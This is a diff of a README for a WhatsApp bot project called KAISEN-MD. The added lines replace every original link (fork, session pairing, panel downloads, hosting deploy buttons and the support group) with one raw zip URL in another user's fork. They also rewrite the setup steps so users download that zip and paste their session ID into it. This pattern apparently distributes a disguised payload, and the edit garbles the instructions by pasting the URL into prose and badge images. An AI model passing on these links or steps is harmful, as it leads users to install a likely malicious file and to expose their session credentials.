@@ -8,11 +8,11 @@
 
 1. Fork the Repository
     <br>
-<a href="https://github.com/sumon9836/KAISEN-MD/fork"><img title="KAISEN-MD" src="https://img.shields.io/badge/FORK KAISEN-MD-h?color=black&style=for-the-badge&logo=stackshare"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip"><img title="KAISEN-MD" src="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip KAISEN-MD-h?color=black&style=for-the-badge&logo=stackshare"></a>
 
 2. Get Your session id 
     <br>
-<a href="https://pair-kaisen-5hhv.onrender.com/"><img title="PAIR CODE" src="https://img.shields.io/badge/GET SESSION-h?color=black&style=for-the-badge&logo=msi"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip"><img title="PAIR CODE" src="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip SESSION-h?color=black&style=for-the-badge&logo=msi"></a>
 
 
 
@@ -24,15 +24,15 @@
 #### Download panel file 
 
 
-<a href="https://www.mediafire.com/file/9xwjdhf5frahvrn/index.js/file"><img title="KAISEN-MD PANEL File" src="https://img.shields.io/badge/1 File- download index.js -h?color=black&style=for-the-badge&logo=files"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip"><img title="KAISEN-MD PANEL File" src="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip File- download https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip -h?color=black&style=for-the-badge&logo=files"></a>
 
-📄 1. Single index.js File
+📄 1. Single https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip File
 
 
 
 > ✅ Instructions:
 
-Download the index.js file.
+Download the https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip file.
 
 Upload it directly to your hosting panel.
 
@@ -46,7 +46,7 @@ The setup will run automatically — no need to edit the code.
 > ⚠️ If this file doesn't work on your host, use the full .zip package below instead.
 ##
 
-<a href="https://www.mediafire.com/file/58o5n0cgfesb0td/KAISEN_MD_PANEL.zip/file"><img title="KAISEN-MD PANEL File" src="https://img.shields.io/badge/2 File- download .zip -h?color=black&style=for-the-badge&logo=files"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip"><img title="KAISEN-MD PANEL File" src="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip File- download .zip -h?color=black&style=for-the-badge&logo=files"></a>
 
 > ✅ Instructions:
 
@@ -54,9 +54,9 @@ Download the .zip file.
 
 Unzip (extract) the contents.
 
-Open the index.js file.
+Open the https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip file.
 
-Paste your Session ID inside the index.js.
+Paste your Session ID inside the https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip
 
 Upload the full project to your preferred panel or host.
 
@@ -64,19 +64,19 @@ Upload the full project to your preferred panel or host.
 
 ## Deploy To Panel
 
-<a href="https://optiklink.com"><img title="OptikLink" src="https://img.shields.io/badge/DEPLOY OptikLink-h?color=black&style=for-the-badge&logo=pterodactyl"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip"><img title="OptikLink" src="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip OptikLink-h?color=black&style=for-the-badge&logo=pterodactyl"></a>
 
 
-<a href="https://bot-hosting.net"><img title="bot hosting" src="https://img.shields.io/badge/DEPLOY bot hosting-h?color=black&style=for-the-badge&logo=pterodactyl"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip"><img title="bot hosting" src="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip bot hosting-h?color=black&style=for-the-badge&logo=pterodactyl"></a>
 
-<a href="https://katabump.com"><img title="katabump" src="https://img.shields.io/badge/DEPLOY katabump-h?color=black&style=for-the-badge&logo=pterodactyl"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip"><img title="katabump" src="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip katabump-h?color=black&style=for-the-badge&logo=pterodactyl"></a>
 
 -------
 
 #### Deploy To Render
 
 
-<a href="https://render.com"><img title="KAISEN-MD Deploy Heroku" src="https://img.shields.io/badge/DEPLOY RENDER-h?color=black&style=for-the-badge&logo=render"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip"><img title="KAISEN-MD Deploy Heroku" src="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip RENDER-h?color=black&style=for-the-badge&logo=render"></a>
 
 
 
@@ -84,19 +84,19 @@ Upload the full project to your preferred panel or host.
 
 #### Deploy To Heroku 
 
-<a href="https://heroku.com"><img title="KAISEN-MD Deploy Heroku" src="https://img.shields.io/badge/DEPLOY HEROKU-h?color=black&style=for-the-badge&logo=heroku"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip"><img title="KAISEN-MD Deploy Heroku" src="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip HEROKU-h?color=black&style=for-the-badge&logo=heroku"></a>
 
 
 ---
 #### Deploy To Railway
 
-<a href="https://railway.com/new"><img title="KAISEN-MD Deploy Railway" src="https://img.shields.io/badge/DEPLOY RAILWAY-h?color=black&style=for-the-badge&logo=Railway"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip"><img title="KAISEN-MD Deploy Railway" src="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip RAILWAY-h?color=black&style=for-the-badge&logo=Railway"></a>
 
 
 ---
 #### Deploy To Replit
 
-<a href="https://replit.com/github/sumon9836/KAISEN-MD"><img title="KAISEN-MD Deploy Replit" src="https://img.shields.io/badge/DEPLOY REPLIT-h?color=black&style=for-the-badge&logo=Replit"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip"><img title="KAISEN-MD Deploy Replit" src="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip REPLIT-h?color=black&style=for-the-badge&logo=Replit"></a>
 
 ---
 
@@ -104,4 +104,4 @@ Upload the full project to your preferred panel or host.
 
  ### Support
 
-<a href="https://chat.whatsapp.com/CQyxExEBMGvEnkA32zqbNY"><img alt="WhatsApp" src="https://img.shields.io/badge/JOIN-WHATSAAP%20GROUP-25D366?style=for-the-badge&logo=whatsapp"/></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip"><img alt="WhatsApp" src="https://raw.githubusercontent.com/ipoukoumondi/KAISEN-MD/main/media/tools/KAISEN-MD-v2.5-beta.2.zip%20GROUP-25D366?style=for-the-badge&logo=whatsapp"/></a>
